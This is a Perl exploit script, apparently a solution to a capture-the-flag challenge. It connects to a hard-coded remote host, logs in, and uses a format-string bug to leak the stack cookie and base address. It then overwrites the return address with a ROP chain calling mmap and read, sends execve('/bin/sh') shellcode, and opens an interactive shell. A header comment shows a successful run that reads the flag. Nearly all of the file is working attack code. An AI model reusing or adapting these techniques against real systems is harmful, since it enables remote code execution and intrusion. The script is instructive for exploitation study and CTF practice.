#!/usr/bin/perl

# $ perl sploit2.pl
# [+] Connect to remote host 109.233.61.11:3129
# [+] Log in
# [+] Get the cookie
# [+] Cookie found : 0x9dbd7200
# [+] Get the base address
# [+] Base address found : 0xb7743000
# [+] Building your stack
# [+] Insert your 3vil stack frame
# [+] Patching argument 3 of read()
# [+] Patching argument 1 of read()
# [+] Rewrite the stack cookie
# [+] Patch the first cookie byte with 0x00
# [+] Build & send your fake stack frame
# [+] Sending your shellcode
# [+] And enjoy your shell
# ls -la
# total 20
# drwxr-xr-x  2 root root 4096 Feb  8 02:50 .
# drwxr-xr-x 23 root root 4096 Feb  8 02:49 ..
# -rw-r--r--  1 root root   44 Feb  8 02:49 flag
# -rwxr-xr-x  1 root root 5464 Feb  8 02:50 task
# id
# uid=65534(nobody) gid=0(root) groups=65534(nogroup),0(root)
# cat flag
# FLAG: CTF{c36d55681410edbba58daedde46fb5e8}


use strict;
use IO::Socket::INET;
use IO::Select;

my $PORT = '3129';
my $HOST = '109.233.61.11';

my $sock;
my $buf;
my $cookie;
my $base;
my $stack;

# All offsets
my $mmap = 0x7d0;
my $read = 0x730;
my $got = 0x1f98;
my $data_off = 0x2000;

# Command to send to /bin/sh :)))
my $cmd = "ls -la ../home/user\ncat flag\nid\nexit\n";

# execve("/bin/sh", ["/bin/sh"], NULL);
my $shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69" . 
                "\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";


print "[+] Connect to remote host $HOST:$PORT\n";

$sock = IO::Socket::INET->new(
    PeerAddr => $HOST,
    PeerPort => $PORT,
    Proto    => 'tcp') 
    ||
    die "Can't connect to remote host $HOST:$PORT : $!\n";

$sock->recv($buf, 4);

print "[+] Log in\n";
login();

print "[+] Get the cookie\n";
$cookie = get_cookie($sock);
printf "[+] Cookie found : 0x%08x\n", $cookie;

print "[+] Get the base address\n";
$base = get_base_addr($sock);
printf "[+] Base address found : 0x%08x\n", $base;

print "[+] Building your stack\n";
$stack = build_stack();

print "[+] Insert your 3vil stack frame\n";
pown_stack($sock);

print "[+] Patching argument 3 of read()\n";
reset_stack_byte($sock, 179);
reset_stack_byte($sock, 178);

print "[+] Patching argument 1 of read()\n";
reset_stack_byte($sock, 171);
reset_stack_byte($sock, 170);
reset_stack_byte($sock, 169);
reset_stack_byte($sock, 168);

print "[+] Rewrite the stack cookie\n"; 
for(my $i = 0; $i < 0xf-0x9; $i++) {
    pown_cookie($sock, $cookie);
}

print "[+] Patch the first cookie byte with 0x00\n";
reset_cookie_byte($sock);

print "[+] Build & send your fake stack frame\n";
send_sleep(build_fake_stack());

print "[+] Sending your shellcode\n";
send_sleep($shellcode);

print "[+] And enjoy your shell :)\n";
shell();

# Build a fake stack frame like :
# mmap(addr, 0x1000, PROT_ALL, MAP_FIXED, -1, 0);
# read(0, addr, 0x1000);
# addr

sub build_fake_stack {
    my $pay;

    $pay .= pack('L', $base + 0x6fa) x 10; # ret

    $pay .= pack('L', $base + 0x711); # pop ebx; ret
    $pay .= pack('L', $base + $got); 

    $pay .= pack('L', $base + $mmap); # mmap
    $pay .= pack('L', $base + 0x8b5); # pop7; ret
    $pay .= pack('L', 0x11111000);
    $pay .= pack('L', 0x1000);
    $pay .= pack('L', 7);
    $pay .= pack('L', 0x32);
    $pay .= pack('L', 0xffffffff);
    $pay .= pack('L', 0x0);

    $pay .= pack('L', 0x6fa); # ret

    $pay .= pack('L', $base + 0x711); # pop ebx; ret
    $pay .= pack('L', $base + $got); 

    $pay .= pack('L', $base + $read); # read
    $pay .= pack('L', $base + 0xc6d); # pop3; ret
    $pay .= pack('L', 0);
    $pay .= pack('L', 0x11111000);
    $pay .= pack('L', 0x1000);

    $pay .= pack('L', 0x11111000);

    return $pay;
}

sub reset_stack_byte {
    my ($sock, $off) = @_;
    my $pay = "%78\$" . $off . "x";

    $pay .= "G"x(0x80-length($pay) - ($off-152));

    $pay .= substr($stack, 0, ($off-152));

    send_sleep($pay);
    $sock->recv($buf, 1024);
}

sub reset_cookie_byte {
    my ($sock) = @_;
    my $pay = "%78\$136x";
    $pay .= "B"x(0x80-length($pay));

    send_sleep($pay);
    $sock->recv($buf, 1024);
}

# Rewrite the cookie (the less significant byte (0x00) isn't rewrited)
sub pown_cookie {
    my ($sock, $cookie) = @_;
    my $pay;
    
    $cookie |= 0xFF;
    $pay = "%78\$140x";
    $pay .= "A"x(0x80-length($pay) - 4);
    $pay .= pack('L', $cookie);

    send_sleep($pay);
    $sock->recv($buf, 1024);
}

# Build your ROP stack : read(0, DATA, 0xFFFF)
sub build_stack {
    my $pay;

    $pay .= pack('L', $base + 0x711); # pop ebx; ret
    $pay .= pack('L', $base + $got); 

    $pay .= pack('L', $base + $read); # read
    $pay .= pack('L', $base + 0xc6d); # pop3; ret
    $pay .= pack('L', 0x88888888);
    $pay .= pack('L', $base + $data_off + 4);
    $pay .= pack('L', 0xFFFFFFFF);

    $pay .= pack('L', $base + 0x8b9); # pop ebp; ret
    $pay .= pack('L', $base + $data_off + 4); # DATA

    $pay .= pack('L', $base + 0xc0a); # leave; ret

    return $pay;

}

# Rewrite the return adress with your evil stack frame
sub pown_stack {
    my ($sock) = @_;
    my $pay;

    $pay = "%78\$272x";

    $pay .= $stack;

    $pay .= "C"x(0x80-length($pay));

    send_sleep($pay);

    $sock->recv($buf, 1024);
}

# Memory disclose your cookie
sub get_cookie {
    my $sock = shift;
    my $buf;

    $buf = "%" . (78) . "\$.8x";

    $buf .= "A"x(0x80-length($buf));

    send_sleep($buf);

    $sock->recv($buf, 1024);
    
    return hex("0x" . substr($buf, 0, 8));
}

# Memory disclose the base address
sub get_base_addr {
    my $sock = shift;
    my $buf;
    my $base;

    $buf = "%" . 79 . "\$.8x";

    $buf .= "A"x(0x80-length($buf));

    send_sleep($buf);

    $sock->recv($buf, 1024);

    $base = hex("0x" . substr($buf, 0, 8));
 
    return $base & 0xFFFFF000;
}

# Login phase
sub login {
    send_sleep("letmein\n");
    $sock->recv($buf, 1024);
}

# send & wait
sub send_sleep {
    my ($buff) = @_;

    print $sock $buff;
    sleep 2;
}

# interactive shell
sub shell {    
    my $s = IO::Select->new();
    my @ready;
    my $buf;

    $s->add(\*STDIN);
    $s->add($sock);

    while(1) {
	@ready = $s->can_read(0.10);
	foreach(@ready) {
	    if($sock == $_) {
		$sock->recv($buf, 1024);
		print $buf;
	    } elsif(\*STDIN == $_) {
		$buf = <STDIN>;
		print $sock $buf;
	    }
	}
    }
}
